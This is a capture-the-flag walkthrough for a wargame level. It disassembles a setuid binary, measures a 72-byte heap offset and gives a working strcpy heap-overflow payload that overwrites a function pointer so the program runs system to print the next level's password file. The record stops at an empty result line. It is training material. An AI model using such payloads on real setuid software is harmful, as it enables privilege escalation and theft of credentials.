level6 - walkthrough
====================

Target: /home/user/level6/level6   (setuid + setgid level7)
Goal:   read /home/user/level7/.pass

1. Recon (objdump -d level6), main():
     malloc(0x40)     -> buf   (64-byte buffer)          [esp+0x1c]
     malloc(4)        -> fp    (function-pointer cell)   [esp+0x18]
     *fp = 0x8048468  (= m, which does puts("Nope"))
     strcpy(buf, argv[1])       ; <-- no bounds check -> heap overflow
     eax = *fp; call *eax       ; calls through the pointer

   Helper functions:
     n() @ 0x08048454 : system("/bin/cat /home/user/level7/.pass")
     m() @ 0x08048468 : puts("Nope")

2. Heap layout / offset
   buf and fp are consecutive heap chunks. With gdb:
     buf = 0x0804a008 , fp = 0x0804a050  ->  fp - buf = 0x48 = 72 bytes.
   So byte 72 of the input lands exactly on the function pointer.

3. Payload (passed as argv[1], so no stdin needed)
     "A"*72 + &n
     &n = 0x08048454 -> \x54\x84\x04\x08   (no NUL, so strcpy copies it all)

     $ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')

   strcpy overflows buf, overwrites fp with &n, and `call *fp` runs
   n() -> the level7 password is printed.

4. Result -- level7 password:
